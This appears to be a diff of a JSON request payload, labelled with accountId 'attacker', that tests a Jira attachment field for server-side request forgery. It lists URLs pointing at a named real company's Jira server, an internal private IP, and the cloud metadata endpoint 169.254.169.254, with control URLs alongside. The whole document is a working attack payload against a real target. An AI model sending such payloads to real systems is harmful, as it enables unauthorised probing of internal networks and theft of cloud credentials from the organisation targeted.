@@ -4,13 +4,14 @@
   "accountId": "attacker",
   "fields": {
     "attachment": [
-      {
-        "id": "10001",
-        "filename": "probe.txt",
-        "size": 1,
-        "mimeType": "text/plain",
-        "content": "http://jira.telekom.de/robots.txt"
-      }
+      {"id":"1","filename":"ctrl-httpbin.txt","size":1,"mimeType":"text/plain","content":"https://httpbin.org/robots.txt"},
+      {"id":"2","filename":"ctrl-one.txt","size":1,"mimeType":"text/plain","content":"https://1.1.1.1/"},
+      {"id":"3","filename":"jira-https-robots.txt","size":1,"mimeType":"text/plain","content":"https://jira.telekom.de/robots.txt"},
+      {"id":"4","filename":"jira-http-robots.txt","size":1,"mimeType":"text/plain","content":"http://jira.telekom.de/robots.txt"},
+      {"id":"5","filename":"jira-serverinfo.json","size":1,"mimeType":"text/plain","content":"https://jira.telekom.de/rest/api/2/serverInfo"},
+      {"id":"6","filename":"jira-http-serverinfo.json","size":1,"mimeType":"text/plain","content":"http://jira.telekom.de/rest/api/2/serverInfo"},
+      {"id":"7","filename":"private-literal.txt","size":1,"mimeType":"text/plain","content":"http://10.175.144.244/robots.txt"},
+      {"id":"8","filename":"metadata.txt","size":1,"mimeType":"text/plain","content":"http://169.254.169.254/latest/meta-data/"}
     ]
   }
 }
